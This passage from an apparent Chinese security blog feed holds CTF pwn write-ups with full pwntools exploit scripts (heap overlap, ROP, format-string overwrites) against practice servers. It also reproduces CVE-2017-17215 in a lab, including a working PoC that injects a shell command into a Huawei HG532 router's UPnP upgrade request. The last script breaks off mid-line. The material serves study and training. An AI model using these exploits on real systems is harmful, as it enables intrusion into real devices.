process(&#x27;./hitcon_ctf_2019_one_punch&#x27;)</span><br>p =remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27110</span>)<br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debut</span>(<span class="hljs-params">idx, name</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;idx:&#x27;</span>, <span class="hljs-built_in">str</span>(idx).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;name:&#x27;</span>, name)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rename</span>(<span class="hljs-params">idx, name</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;idx:&#x27;</span>, <span class="hljs-built_in">str</span>(idx).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;name:&#x27;</span>, name)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;idx:&#x27;</span>, <span class="hljs-built_in">str</span>(idx).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">retire</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;idx:&#x27;</span>, <span class="hljs-built_in">str</span>(idx).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">backdoor</span>(<span class="hljs-params">content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;50056&#x27;</span>)<br>    p.send(content)<br><br>debut(<span class="hljs-number">0</span> ,<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x210</span>)<br>retire(<span class="hljs-number">0</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>    rename(<span class="hljs-number">0</span>, p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span>)<br>    retire(<span class="hljs-number">0</span>)<br><br>debut(<span class="hljs-number">0</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x310</span>)<br>debut(<span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x310</span>)<br>retire(<span class="hljs-number">0</span>)<br>retire(<span class="hljs-number">1</span>)<br>show(<span class="hljs-number">1</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;name: &#x27;</span>)<br>heap_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x260</span> - <span class="hljs-number">0x220</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    rename(<span class="hljs-number">0</span>, p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span>)<br>    retire(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;name: &#x27;</span>)<br>leak = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libcbase = leak - <span class="hljs-number">96</span> - <span class="hljs-number">0x10</span> - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>free_hook = libcbase + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>malloc_hook = libcbase + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>pop_rdi = libcbase + <span class="hljs-number">0x26542</span><br>pop_rsi = libcbase + <span class="hljs-number">0x26f9e</span><br>pop_rdx = libcbase + <span class="hljs-number">0x12bda6</span><br>pop_rax = libcbase + <span class="hljs-number">0x47cf8</span><br>syscall_ret = libcbase + <span class="hljs-number">0xcf6c5</span><br><br>debut(<span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0xf0</span>)<br>debut(<span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x310</span>)<br>debut(<span class="hljs-number">2</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x240</span>)<br>retire(<span class="hljs-number">2</span>)<br>retire(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    rename(<span class="hljs-number">2</span>, p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span>)<br>    retire(<span class="hljs-number">2</span>)<br>debut(<span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x320</span>)<br>debut(<span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x310</span>)<br>rename(<span class="hljs-number">2</span>, p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span>)<br>retire(<span class="hljs-number">2</span>)<br>retire(<span class="hljs-number">1</span>)<br>debut(<span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x340</span>)<br>debut(<span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x240</span>)<br><br>payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">5</span> + p64(<span class="hljs-number">0x221</span>)  + p64(heap_addr + <span class="hljs-number">0x570</span>) + p64(malloc_hook - <span class="hljs-number">0x38</span>)<br>rename(<span class="hljs-number">2</span>, payload)<br>debut(<span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;flag&#x27;</span>.ljust(<span class="hljs-number">0x210</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">5</span> + p64(libcbase + <span class="hljs-number">0x99540</span>)<br>backdoor(payload)<br><br>payload = flat(<br>    p64(pop_rdi), p64(heap_addr + <span class="hljs-number">0x580</span>),<br>    p64(pop_rsi), p64(<span class="hljs-number">0</span>),<br>    p64(pop_rax), p64(<span class="hljs-number">2</span>),<br>    p64(syscall_ret),<br><br>    p64(pop_rdi), p64(<span class="hljs-number">3</span>),<br>    p64(pop_rsi), p64(heap_addr),<br>    p64(pop_rdx), p64(<span class="hljs-number">0x30</span>),<br>    p64(pop_rax), p64(<span class="hljs-number">0</span>),<br>    p64(syscall_ret),<br><br>    p64(pop_rdi), p64(<span class="hljs-number">1</span>),<br>    p64(pop_rsi), p64(heap_addr),<br>    p64(pop_rdx), p64(<span class="hljs-number">0x30</span>),<br>    p64(pop_rax), p64(<span class="hljs-number">1</span>),<br>    p64(syscall_ret)<br>)<br>payload = payload.ljust(<span class="hljs-number">0x300</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>debut(<span class="hljs-number">1</span>, payload)<br><span class="hljs-comment">#pause()</span><br>p.interactive()<br></code></pre></td></tr></table></figure><p>​</p><h3 id="xman-2019-format"><a href="#xman-2019-format" class="headerlink" title="xman_2019_format"></a>xman_2019_format</h3><p>程序存在多个函数嵌套，而ebp中保存上一个函数栈的值，利用ebp的数据修改一定的偏移，将其指向返回地址，最后修改返回地址</p><p>​</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;xman_2019_format&#x27;</span>)<br><span class="hljs-keyword">global</span> p<br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br>num1 = <span class="hljs-number">0x38</span><br>num2 = <span class="hljs-number">0x39</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>():<br>    payload = <span class="hljs-string">b&#x27;%10$p|&#x27;</span><br>    payload += <span class="hljs-string">b&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(num1 + <span class="hljs-number">4</span>).encode() + <span class="hljs-string">b&#x27;c%10$hhn|%&#x27;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-number">0xab</span>).encode() + <span class="hljs-string">b&#x27;c%18$hhn|%&#x27;</span> <br>    payload += <span class="hljs-built_in">str</span>(num2 + <span class="hljs-number">4</span>).encode() + <span class="hljs-string">b&#x27;c%10$hhn|%&#x27;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-number">0x85</span>).encode() + <span class="hljs-string">b&#x27;c%18$hhn&#x27;</span><br>    <span class="hljs-comment">#gdb.attach(p)</span><br>    <span class="hljs-comment">#pause()</span><br>    p.send(payload)<br>    p.recvuntil(<span class="hljs-string">b&#x27;58&#x27;</span>, timeout=<span class="hljs-number">1</span>)<br>    <span class="hljs-comment">#pause()</span><br>    p.interactive()<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment">#p = process(&#x27;./xman_2019_format&#x27;)</span><br>        p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27991</span>)<br>        pwn()<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        p.close()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>简单复现CVE-2017-17215</title>
    <link href="/2023/01/01/CVE-2017-17215/"/>
    <url>/2023/01/01/CVE-2017-17215/</url>
    
    <content type="html"><![CDATA[<p>​</p><p>由于不想重新再开一个虚拟机，这里就直接使用<a href="https://github.com/VulnTotal-Team/IoT-vulhub">IoT-vulhub</a>这个项目来配置的环境。</p><p>CVE-2017-17215在项目中只能依赖于qemu-system启动，需要我们事先构建好相应qemu-system的docker镜像。华为 HG532路由器的固件是mips大端架构，所以先进入到<code>/baseImage/qemu-system/mips/images</code>下载好相应的qemu启动镜像，再去构建<code>qemu-system:mips</code>的docker镜像</p><img src="/img/9/Screenshot_20230108_021304.png" style="zoom: 80%;" /><p>最后按照项目的<a href="https://github.com/VulnTotal-Team/IoT-vulhub/tree/master/HUAWEI/CVE-2017-17215">教程</a>来就可以正常运行启动环境了。</p><p>​</p><p>这里是在docker中再去运行qemu-system，qemu-system中的ip在本机上是无法直接访问的，在使用ssh通过2345端口转发后，如果想使用本机的浏览器去访问路由登录界面也需要设置相应的代理</p><img src="/img/9/Screenshot_20230108_022129.png" style="zoom: 50%;" /><p>使用firefox直接去访问<code>http://192.168.2.2/</code>可能报错，需要在<code>about:config</code>中去更改security.tls.version.fallback-limit和security.tls.version.min</p><img src="/img/9/Screenshot_20230108_024054.png"  /><p>更改后就可以正常访问<code>http://192.168.2.2/</code>路由登录界面了</p><p>​</p><p>poc如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br> <br>headers = &#123;<br>    <span class="hljs-string">&quot;Authorization&quot;</span>: <span class="hljs-string">&quot;Digest username=dslf-config, realm=HuaweiHomeGateway, nonce=88645cefb1f9ede0e336e3569d75ee30, uri=/ctrlt/DeviceUpgrade_1, response=3612f843a42db38f48f59d2a3597e19c, algorithm=MD5, qop=auth, nc=00000001, cnonce=248d1a2560100669&quot;</span><br>&#125;<br> <br>data = <span class="hljs-string">&#x27;&#x27;&#x27;&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="hljs-string"> &lt;s:Envelope xmlns:s=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; s:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;</span><br><span class="hljs-string">  &lt;s:Body&gt;&lt;u:Upgrade xmlns:u=&quot;urn:schemas-upnp-org:service:WANPPPConnection:1&quot;&gt;</span><br><span class="hljs-string">   &lt;NewStatusURL&gt;;/bin/busybox ls;&lt;/NewStatusURL&gt;</span><br><span class="hljs-string">   &lt;NewDownloadURL&gt;HUAWEIUPNP&lt;/NewDownloadURL&gt;</span><br><span class="hljs-string">  &lt;/u:Upgrade&gt;</span><br><span class="hljs-string"> &lt;/s:Body&gt;</span><br><span class="hljs-string">&lt;/s:Envelope&gt;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>response = requests.post(<span class="hljs-string">&#x27;http://192.168.2.2:37215/ctrlt/DeviceUpgrade_1&#x27;</span>,headers=headers,data=data)<br></code></pre></td></tr></table></figure><p>​</p><p>运行如下：</p><img src="/img/9/Screenshot_20230108_043234.jpg"  /><p>在此过程中，可以进入docker中使用tcdump去抓取流量，然后复制到本机中用Wireshark具体分析：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">tcpdump -i tap0 -w result.cap<br><br>docker cp <span class="hljs-number">74</span>d6970b35fb:<span class="hljs-regexp">/root/</span>result.cap <span class="hljs-regexp">/home/</span>kali/Desktop<br></code></pre></td></tr></table></figure><p>​</p><p>这个命令注入的实现是在&#x2F;bin&#x2F;upnp这个文件中的sub_40749c函数引发的，通过对NewStatusURL和NewDownloadURL字符串的交叉引用，很容易在binaryninja发现该函数</p><p><img src="/img/9/Screenshot_20230108_044959.png"></p><p>​</p><p>参考：</p><p><a href="https://www.iotsec-zone.com/article?id=187#%E8%AE%BE%E5%A4%87%E7%B3%BB%E7%BB%9F%E5%88%86%E6%9E%90">华为HG532 - CVE-2017-17215漏洞简析- IOTsec-Zone物联网安全社区</a></p><p>[<a href="https://bbs.kanxue.com/thread-274713.htm">原创]华为HG532路由器命令注入漏洞分析(CVE-2017-17215)-智能设备-看雪论坛-安全社区|安全招聘|bbs.pediy.com (kanxue.com)</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>buu寒假练习1</title>
    <link href="/2022/12/30/buu1/"/>
    <url>/2022/12/30/buu1/</url>
    
    <content type="html"><![CDATA[<h3 id="ycb-2020-easy-heap"><a href="#ycb-2020-easy-heap" class="headerlink" title="ycb_2020_easy_heap"></a>ycb_2020_easy_heap</h3><p>程序在使用edit功能时出现了<code>&#39;\x00&#39;</code>字节溢出，很容易想到修改下一个chunk的prev_size 、size 和 PREV_INUSE标志位，让其与上边的unsorted chunk合并造成堆块重叠</p><img src="/img/8/Screenshot_20230101_012711.png" style="zoom: 80%;" /><p>​</p><p>然而这里是libc-2.30.so，会对合并的上一个chunk的size检查，与修改的prev_size对比，这样以前的方法就不能继续使用了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//_int_free中的检查片段</span><br><span class="hljs-keyword">if</span> (!prev_inuse(p)) &#123;<br>      prevsize = prev_size (p);<br>      size += prevsize;<br>      p = chunk_at_offset(p, -((<span class="hljs-type">long</span>) prevsize));<br>      <span class="hljs-keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))<br>        malloc_printerr (<span class="hljs-string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);<br>      unlink_chunk (av, p);<br>    &#125;      <br></code></pre></td></tr></table></figure><p>这种高版本的off-by-one总结如下：</p><ol><li>让合并的chunk的size与伪造的prev_size相等，才能通过检查，但修改正常chunk的size是不可能的，所以在chunk中去伪造另一个chunk即可；</li><li>由于堆块的合并还要通过unlink的检查，main_arena和bss中一般并不存在我们伪造chunk的地址（当然有PIE保护也就不用考虑bss），所以需要先去泄漏堆地址，我们自己在堆上写入伪造chunk的地址；</li><li>与以前unlink攻击的思路一样，伪造chunk的fd和bk也是需要与我们写入的地址相对应的。</li></ol><p>具体构造如下：</p><img src="/img/8/Screenshot_20230101_022934.png" style="zoom: 67%;" /><p>​                                                 </p><p>程序开了沙盒，在<code>__free_hook</code>中写入rdi与rdx转化的gedget，再与<code>setcontext</code>函数相结合劫持rsp到堆上，最后直接ROP或者使用mprotect后写入shellcode</p><p>​                                                                                        </p><p>完整的exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;easy_heap&#x27;</span>)<br>libc = elf.libc<br><span class="hljs-comment">#p = process(&#x27;./easy_heap&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27074</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Choice:&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Size:&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Choice:&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Content:&#x27;</span>, content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Choice:&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Choice:&#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><br>add(<span class="hljs-number">0x410</span>)<br>add(<span class="hljs-number">0x10</span>)<br>delete(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x420</span>)<span class="hljs-comment">#本来是想通过large chunk一次性泄漏libc地址和堆地址, 但edit会引入&#x27;\x00&#x27;，最后改为tcache泄漏堆地址</span><br>add(<span class="hljs-number">0x130</span>)<br>show(<span class="hljs-number">2</span>)<br>leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libcbase = leak - <span class="hljs-number">1104</span> - <span class="hljs-number">0x10</span> - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br><br>add(<span class="hljs-number">0x10</span>)<br>delete(<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">3</span>)<br>add(<span class="hljs-number">0x18</span>)<br>show(<span class="hljs-number">1</span>)<span class="hljs-comment">#重新申请后tcache指针依然残留，进而泄漏堆地址</span><br>p.recvuntil(<span class="hljs-string">b&#x27;Content: &#x27;</span>)<br>heap_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x6c0</span><br><br>add(<span class="hljs-number">0x110</span>)<br>payload1 = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0xf0</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>)<br>edit(<span class="hljs-number">3</span>, payload1)<br>payload2 = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p64(heap_addr + <span class="hljs-number">0x2a0</span> + <span class="hljs-number">0x20</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x131</span>) + p64(heap_addr + <span class="hljs-number">0x2a0</span>) + p64(heap_addr + <span class="hljs-number">0x2a0</span> + <span class="hljs-number">8</span>)<br>edit(<span class="hljs-number">2</span>, payload2)<span class="hljs-comment">#伪造堆块</span><br>payload3 = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0x130</span>)<br>edit(<span class="hljs-number">1</span>, payload3)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(<span class="hljs-number">0xf0</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>, <span class="hljs-number">11</span>):<br>    delete(i)<br>delete(<span class="hljs-number">3</span>)<br>add(<span class="hljs-number">0x100</span>)<br>add(<span class="hljs-number">0x10</span>)<br>add(<span class="hljs-number">0x10</span>)<br>delete(<span class="hljs-number">4</span>)<br>delete(<span class="hljs-number">5</span>)<br><br>free_hook = libcbase + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>setcontext = libcbase + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>magic_gadget = libcbase + <span class="hljs-number">0x154b90</span><br>pop_rdi = libcbase + <span class="hljs-number">0x26bb2</span><br>pop_rsi = libcbase + <span class="hljs-number">0x2709c</span><br>pop_rdx_r12 = libcbase + <span class="hljs-number">0x11c421</span><br>ret = libcbase + <span class="hljs-number">0x256b9</span><br>mprotect = libcbase + libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br><br>edit(<span class="hljs-number">1</span>, p64(free_hook))<br>add(<span class="hljs-number">0x10</span>)<br>add(<span class="hljs-number">0x10</span>)<br>edit(<span class="hljs-number">5</span>, p64(magic_gadget))<br><br>payload = p64(<span class="hljs-number">0</span>) + p64(heap_addr + <span class="hljs-number">0x6e0</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(setcontext + <span class="hljs-number">61</span>)<br>payload = payload.ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload += p64(heap_addr + <span class="hljs-number">0x6e0</span> + <span class="hljs-number">0x100</span>) + p64(ret)<br>payload = payload.ljust(<span class="hljs-number">0x100</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload += p64(pop_rdi) + p64(heap_addr) + p64(pop_rsi) + p64(<span class="hljs-number">0x1000</span>) + p64(pop_rdx_r12) + p64(<span class="hljs-number">7</span>) + p64(<span class="hljs-number">0</span>) + p64(mprotect)<br>payload += p64(heap_addr + <span class="hljs-number">0x6e0</span> + <span class="hljs-number">0x150</span>)<br>payload = payload.ljust(<span class="hljs-number">0x150</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload += asm(shellcraft.cat(<span class="hljs-string">&#x27;flag&#x27;</span>))<br><br>edit(<span class="hljs-number">0</span>, payload)<br>delete(<span class="hljs-number">0</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>​                                                                 </p><p>​                                                                                        </p><h3 id="VNCTF2021-hh"><a href="#VNCTF2021-hh" class="headerlink" title="VNCTF2021 hh"></a>VNCTF2021 hh</h3><p>vmpwn类型的题，指令和操作数都是4个字节，主要使用如下指令：</p><img src="/img/8/Screenshot_20230101_041533.png" style="zoom:67%;" /><p>​</p><p>利用思路：</p><ol><li>v32存在于栈上，执行指令<code>0xb  n</code>时会造成数组越界，可以将栈上其它的内容写入v32数组，再配合指令<code>0xe</code>就可以泄漏栈地址和<code>__libc_start_main</code>地址；</li><li>指令<code>0x9  n</code>可以在v32数组上写入任何数，再配合指令<code>0xd  n</code>，同样是数组越界将v32数组的内容写入到栈上其它地方，当然这里直接写入函数返回地址，执行ROP。</li></ol><p>​                                                            </p><p>完整exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;hh&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;libc.so.6&#x27;</span>)<br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="hljs-number">27244</span>)<br><span class="hljs-comment">#p = process(&#x27;./hh&#x27;)</span><br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sendgadget</span>(<span class="hljs-params">gadget</span>):<br>    l = <span class="hljs-built_in">len</span>(gadget) // <span class="hljs-number">4</span><br>    gadget = <span class="hljs-built_in">int</span>.from_bytes(gadget, byteorder=<span 